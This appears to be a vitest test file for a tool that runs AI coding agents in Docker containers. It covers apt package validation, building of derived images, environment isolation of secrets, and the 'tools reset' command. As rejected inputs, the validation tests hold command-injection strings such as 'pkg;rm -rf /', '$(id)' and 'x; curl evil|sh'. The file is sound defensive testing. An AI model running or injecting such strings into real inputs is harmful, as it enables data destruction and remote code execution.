// Tools in the container (docs/design/autonomy.md Decision 14): the tools volume and its env, container.aptPackages
// (schema, image tag, derived image, control classification, start/status planning) and `minions tools reset`.
import { mkdtemp, readFile, rm } from 'node:fs/promises';
import { mkdtempSync, readFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { AptPackagesSchema, MinionsConfigSchema, RESERVED_ENV } from '../../src/config/schema.js';
import { CONTAINER_PATH, TOOLS_ENV, TOOLS_PATH, volumeNames } from '../../src/core/paths.js';
import type { RunOptions, RunResult } from '../../src/core/exec.js';
import { Compose, aptDockerfile, aptImageTag, composeYaml, ensureAptImage, runtimeImageTag } from '../../src/host/docker.js';
import { ProjectJsonSchema, type ProjectJson } from '../../src/host/project.js';
import { checkRestartRequired } from '../../src/host/restart-required.js';
import { describeAptChange, overlayAptPackages, planAptPackages, toolsReset } from '../../src/host/tools.js';
import { generatePlugin } from '../../src/plugin/generate.js';
import { appliesOn, controlSet } from '../../src/runtime/control.js';
import { workerEnv } from '../../src/runtime/dispatch-launch.js';
import { verifyEnv } from '../../src/runtime/integrator.js';
import { SESSION_ENV_ALLOW } from '../../src/runtime/sessions.js';
import { defaults } from '../helpers.js';

const ID = '3f2b8c1e-7d4a-4e9b-9c2f-1a2b3c4d5e6f';
const project = (container: Partial<ProjectJson['container']> = {}): ProjectJson => ({
  version: 1, projectId: ID, repoPath: '/Users/x/repo', gitCommonDir: '/Users/x/repo/.git', visibility: 'private',
  mode: 'supervised', imageTag: 'minions-runtime:0.1.0', baseBranch: 'main', remoteUrl: null,
  gitIdentity: { name: 'Ada', email: 'ada@example.com' },
  container: { cpus: 4, memoryMiB: 6144, pidsLimit: 512, publishPorts: [], network: 'outbound-internet', ...container },
});
const ok = (stdout = ''): RunResult => ({ code: 0, stdout, stderr: '' });
const fail = (stderr = 'no'): RunResult => ({ code: 1, stdout: '', stderr });
type Call = { args: string[]; opts?: RunOptions };
const recorder = (answer: (a: string) => RunResult | undefined) => {
  const calls: Call[] = [];
  const runner = async (cmd: string, args: string[], opts?: RunOptions): Promise<RunResult> => {
    calls.push({ args, opts });
    if (cmd !== 'docker') return fail();
    return answer(args.join(' ')) ?? fail();
  };
  return { calls, runner, lines: () => calls.map((c) => c.args.join(' ')) };
};

describe('container.aptPackages schema', () => {
  it('takes plain Debian package names, at most 50', () => {
    expect(AptPackagesSchema.safeParse(['pkg-config', 'libssl-dev', 'g++', 'python3.12', 'lib32z1']).success).toBe(true);
    for (const bad of ['Foo', 'a', '-y', 'pkg;rm -rf /', 'pkg name', 'pkg=1.2', 'pkg:amd64', '$(id)', '']) {
      expect(AptPackagesSchema.safeParse([bad]).success, bad).toBe(false);
    }
    expect(AptPackagesSchema.safeParse(Array.from({ length: 50 }, (_, i) => `pkg${i}`)).success).toBe(true);
    expect(AptPackagesSchema.safeParse(Array.from({ length: 51 }, (_, i) => `pkg${i}`)).success).toBe(false);
  });

  it('is an optional container key of the config and of project.json', () => {
    const cfg = defaults();
    expect(MinionsConfigSchema.safeParse({ ...cfg, container: { ...cfg.container, aptPackages: ['libssl-dev'] } }).success).toBe(true);
    expect(MinionsConfigSchema.safeParse({ ...cfg, container: { ...cfg.container, aptPackages: ['Bad'] } }).success).toBe(false);
    expect(ProjectJsonSchema.safeParse(project({ aptPackages: ['libssl-dev'] })).success).toBe(true);
    expect(ProjectJsonSchema.safeParse(project({ aptPackages: ['x y'] })).success).toBe(false);
  });
});

describe('the tools volume', () => {
  it('compose mounts a per-project named volume at /opt/tools and sets the tools env and PATH', () => {
    const y = composeYaml(project());
    expect(y).toMatch(/- type: volume\n\s+source: tools\n\s+target: "\/opt\/tools"/);
    expect(y).toContain(`  tools:\n    name: "${volumeNames(ID).tools}"`);
    expect(volumeNames(ID).tools).toBe('minions-3f2b8c1e-tools');
    expect(y).toContain(`      PATH: "${CONTAINER_PATH}"`);
    for (const [k, v] of Object.entries(TOOLS_ENV)) expect(y, k).toContain(`      ${k}: "${v}"`);
    // System directories first: an installed tool never shadows git or minions.
    expect(CONTAINER_PATH.indexOf('/usr/bin')).toBeLessThan(CONTAINER_PATH.indexOf('/opt/tools'));
  });

  it('the image creates /opt/tools owned by node (a fresh named volume copies it) and sets the same env', () => {
    const df = readFileSync(join(import.meta.dirname, '..', '..', 'docker', 'Dockerfile'), 'utf8');
    expect(df).toMatch(/mkdir -p [^\n]*\\\n\s+\/opt\/tools\/bin /);
    expect(df).toMatch(/chown -R node:node [^\n]*\/opt\/tools/);
    for (const [k, v] of Object.entries(TOOLS_ENV)) expect(df, k).toMatch(new RegExp(`^    ${k}=${v}( \\\\)?$`, 'm'));
    expect(df).toMatch(new RegExp(`^    PATH=${CONTAINER_PATH}$`, 'm'));
  });

  it('the worker env inherits the tools locations, and the `env` map cannot set them', () => {
    for (const k of Object.keys(TOOLS_ENV)) {
      expect(SESSION_ENV_ALLOW as readonly string[], k).toContain(k);
      expect(RESERVED_ENV.test(k), k).toBe(true);
    }
    const env = workerEnv({ PATH: CONTAINER_PATH, ...TOOLS_ENV, SECRET_THING: 's' }, '/state/run/dispatch/config/lease-1',
      { method: 'login', envName: 'CLAUDE_CODE_OAUTH_TOKEN', token: 'tok', source: 'f' }, { leaseId: 'lease-1', role: 'engineer', tmp: '/tmp/x' });
    expect(env).toMatchObject({ PATH: CONTAINER_PATH, ...TOOLS_ENV });
    expect(env).not.toHaveProperty('SECRET_THING');
  });

  it('the verify step\'s env carries the tools locations and PATH in the container, still no secrets and a fresh HOME', () => {
    const env = verifyEnv({ MINIONS_RUNTIME: 'container', PATH: '/usr/bin:/bin', HOME: '/home/node', GH_TOKEN: 'secret', LANG: 'C.UTF-8' }, '/state/run/integration');
    expect(env).toMatchObject({ ...TOOLS_ENV, HOME: '/state/run/integration/home', CI: '1', LANG: 'C.UTF-8' });
    expect(env.PATH).toBe(['/usr/bin', '/bin', ...TOOLS_PATH].join(':'));
    expect(env).not.toHaveProperty('GH_TOKEN');
    // No duplicates when PATH already has them.
    expect(verifyEnv({ MINIONS_RUNTIME: 'container', PATH: CONTAINER_PATH }, '/r').PATH).toBe(CONTAINER_PATH);
    // Host runtime: the owner's machine, nothing added.
    const host = verifyEnv({ MINIONS_RUNTIME: 'host', PATH: '/usr/bin' }, '/r');
    expect(host.PATH).toBe('/usr/bin');
    expect(host).not.toHaveProperty('CARGO_HOME');
  });
});

describe('the apt-derived image', () => {
  it('the tag changes with the package list (order and duplicates do not matter); none = the base tag', () => {
    const base = 'minions-runtime:0.1.0';
    expect(aptImageTag(base, [])).toBe(base);
    expect(aptImageTag(base, undefined)).toBe(base);
    const a = aptImageTag(base, ['libssl-dev', 'pkg-config']);
    expect(a).toMatch(/^minions-runtime:0\.1\.0-apt-[0-9a-f]{12}$/);
    expect(aptImageTag(base, ['pkg-config', 'libssl-dev', 'pkg-config'])).toBe(a);
    expect(aptImageTag(base, ['pkg-config'])).not.toBe(a);
    expect(runtimeImageTag(project({ aptPackages: ['libssl-dev', 'pkg-config'] }))).toBe(a);
    expect(composeYaml(project({ aptPackages: ['libssl-dev', 'pkg-config'] }))).toContain(`    image: "${a}"`);
    expect(composeYaml(project())).toContain(`    image: "${base}"`);
  });

  it('the Dockerfile installs the packages as root on the base and returns to node; bad names never reach it', () => {
    const df = aptDockerfile('minions-runtime:0.1.0', ['pkg-config', 'libssl-dev']);
    expect(df).toContain('FROM minions-runtime:0.1.0\nUSER root\n');
    expect(df).toContain('apt-get install -y --no-install-recommends libssl-dev pkg-config');
    expect(df.trimEnd().endsWith('USER node')).toBe(true);
    expect(() => aptDockerfile('b', ['ok-pkg', 'x; curl evil|sh'])).toThrow(/not a Debian package name/);
  });

  it('ensureAptImage builds when missing or built on another base, and skips when current or empty', async () => {
    let derivedLabel: string | null = null;
    const r = recorder((a) => {
      if (a.includes('image inspect') && a.endsWith(' minions-runtime:0.1.0')) return ok('fp1\n');
      if (a.includes('image inspect')) return derivedLabel === null ? fail('No such image') : ok(derivedLabel + '\n');
      if (a.startsWith('build ')) return ok();
      return undefined;
    });
    expect(await ensureAptImage('minions-runtime:0.1.0', [], { runner: r.runner })).toBe(false);
    expect(r.calls).toHaveLength(0);
    expect(await ensureAptImage('minions-runtime:0.1.0', ['libssl-dev'], { runner: r.runner })).toBe(true);
    const build = r.calls.find((c) => c.args[0] === 'build')!;
    expect(build.args).toEqual(['build', '-t', aptImageTag('minions-runtime:0.1.0', ['libssl-dev']), '--label', 'minions.build=fp1', '-']);
    expect(build.opts?.input).toContain('--no-install-recommends libssl-dev');
    derivedLabel = 'fp1';
    r.calls.length = 0;
    expect(await ensureAptImage('minions-runtime:0.1.0', ['libssl-dev'], { runner: r.runner })).toBe(false);
    derivedLabel = 'fp0'; // the base was rebuilt since
    expect(await ensureAptImage('minions-runtime:0.1.0', ['libssl-dev'], { runner: r.runner })).toBe(true);
  });
});

describe('container.aptPackages through the control layer', () => {
  let state: string;
  beforeEach(() => { state = mkdtempSync(join(tmpdir(), 'minions-tools-control-')); });
  afterEach(() => rmSync(state, { recursive: true, force: true }));

  it('is coordinator-editable, applies at the next container recreate (start or upgrade), and is validated', async () => {
    expect(appliesOn('container.aptPackages')).toEqual({ appliesOn: 'container-recreate', hostOwned: false });
    const c = await controlSet({ state, base: defaults() }, 'container.aptPackages', ['pkg-config'], 'openssl-sys needs it');
    expect(c.keys).toEqual([{ key: 'container.aptPackages', appliesOn: 'container-recreate', hostOwned: false }]);
    await expect(controlSet({ state, base: defaults() }, 'container.aptPackages', ['$(id)'], 'x')).rejects.toMatchObject({ code: 'INVALID_CONFIG' });
  });

  it('planAptPackages: the overlay wins over the config; an unreadable or invalid overlay keeps the current list', async () => {
    const cfg = defaults();
    const withCfg = { ...cfg, container: { ...cfg.container, aptPackages: ['zlib1g-dev'] } };
    const overlay = (pkgs: unknown) => async () => JSON.stringify({ revision: 1, config: { container: { aptPackages: pkgs } } });
    let p = await planAptPackages(project(), withCfg, overlay(['pkg-config', 'libssl-dev']));
    expect(p).toMatchObject({ desired: ['libssl-dev', 'pkg-config'], current: [], changed: true, source: 'control' });
    expect(describeAptChange(p)).toBe('+libssl-dev +pkg-config');
    p = await planAptPackages(project({ aptPackages: ['pkg-config'] }), withCfg, async () => '{}');
    expect(p).toMatchObject({ desired: ['zlib1g-dev'], changed: true, source: 'config' });
    expect(describeAptChange(p)).toBe('+zlib1g-dev -pkg-config');
    p = await planAptPackages(project({ aptPackages: ['pkg-config'] }), withCfg, overlay(['bad name']));
    expect(p).toMatchObject({ desired: ['pkg-config'], changed: false });
    expect(p.warning).toMatch(/invalid/);
    p = await planAptPackages(project({ aptPackages: ['pkg-config'] }), cfg, async () => { throw new Error('docker down'); });
    expect(p).toMatchObject({ desired: ['pkg-config'], changed: false });
    expect(overlayAptPackages('{"revision":0,"config":{}}')).toBeUndefined();
  });

  it('minions status reports "image rebuild pending" while the overlay differs from the image', async () => {
    const overlay = JSON.stringify({ revision: 2, config: { container: { aptPackages: ['pkg-config'] } } });
    const r = recorder((a) => {
      if (a.includes(' ps -a --format json')) return ok(JSON.stringify({ State: 'running' }));
      if (a.includes(' ps --status running -q')) return ok('cid\n');
      if (a.includes('exec -T app sh -c') && a.endsWith('/state/control/overlay.json')) return ok(overlay);
      return undefined;
    });
    const compose = new Compose(ID, r.runner);
    const res = await checkRestartRequired({ projectId: ID, imageTag: 'minions-runtime:0.1.0', compose, runner: r.runner, fingerprint: null, version: '1',
      status: null, apt: { project: project(), config: defaults() } });
    expect(res.reasons).toContainEqual(expect.objectContaining({ kind: 'apt-packages', current: 'pkg-config', detail: 'image rebuild pending: aptPackages changed (+pkg-config)' }));
    expect(res.required).toBe(true);
  });
});

describe('minions tools reset', () => {
  const world = (state: 'running' | 'exited', volume = true) => recorder((a) => {
    if (a.includes(' ps -a --format json')) return ok(JSON.stringify({ State: state }));
    if (a.startsWith('volume inspect')) return volume ? ok('[]') : fail('no such volume');
    if (a.endsWith(' down') || a.startsWith('volume rm')) return ok();
    return undefined;
  });

  it('removes the volume of a stopped container', async () => {
    const w = world('exited');
    const r = await toolsReset(project(), { runner: w.runner, confirm: async () => { throw new Error('not asked'); } });
    expect(r).toMatchObject({ volume: 'minions-3f2b8c1e-tools', removed: true, stopped: false });
    expect(w.lines().at(-1)).toBe('volume rm minions-3f2b8c1e-tools');
  });

  it('a running container is stopped only after a confirmation or --yes', async () => {
    let w = world('running');
    await expect(toolsReset(project(), { runner: w.runner, confirm: async () => null })).rejects.toMatchObject({ code: 'PRECONDITION' });
    await expect(toolsReset(project(), { runner: w.runner, confirm: async () => false })).rejects.toMatchObject({ code: 'PRECONDITION' });
    expect(w.lines().some((l) => l.endsWith(' down') || l.startsWith('volume rm'))).toBe(false);
    let stoppedHook = false;
    w = world('running');
    const r = await toolsReset(project(), { yes: true, runner: w.runner, confirm: async () => null, afterStop: async () => { stoppedHook = true; } });
    expect(r).toMatchObject({ stopped: true, removed: true });
    expect(stoppedHook).toBe(true);
    const lines = w.lines();
    expect(lines.findIndex((l) => l.endsWith(' down'))).toBeLessThan(lines.indexOf('volume rm minions-3f2b8c1e-tools'));
  });

  it('nothing to do without the volume, and --dry-run changes nothing', async () => {
    let w = world('running', false);
    expect(await toolsReset(project(), { runner: w.runner, confirm: async () => true })).toMatchObject({ removed: false, stopped: false });
    w = world('running');
    expect(await toolsReset(project(), { dryRun: true, runner: w.runner, confirm: async () => true })).toMatchObject({ removed: false, dryRun: true });
    expect(w.lines().some((l) => l.endsWith(' down') || l.startsWith('volume rm'))).toBe(false);
  });
});

describe('prompts', () => {
  it('coordinator and engineer get the tools guidance on the Docker runtime only', async () => {
    for (const runtime of ['docker', 'host'] as const) {
      const out = await mkdtemp(join(tmpdir(), 'minions-tools-plugin-'));
      try {
        await generatePlugin(defaults(), out, { runtime });
        const coord = await readFile(join(out, 'coordinator.md'), 'utf8');
        const eng = await readFile(join(out, 'agents', 'engineer.md'), 'utf8');
        if (runtime === 'docker') {
          expect(coord).toContain('`/opt/tools`');
          expect(coord).toContain('minions control set container.aptPackages');
          expect(eng).toContain('rustup-init -y --no-modify-path');
        } else {
          expect(coord).not.toContain('/opt/tools');
          expect(eng).not.toContain('/opt/tools');
        }
      } finally { await rm(out, { recursive: true, force: true }); }
    }
  });
});
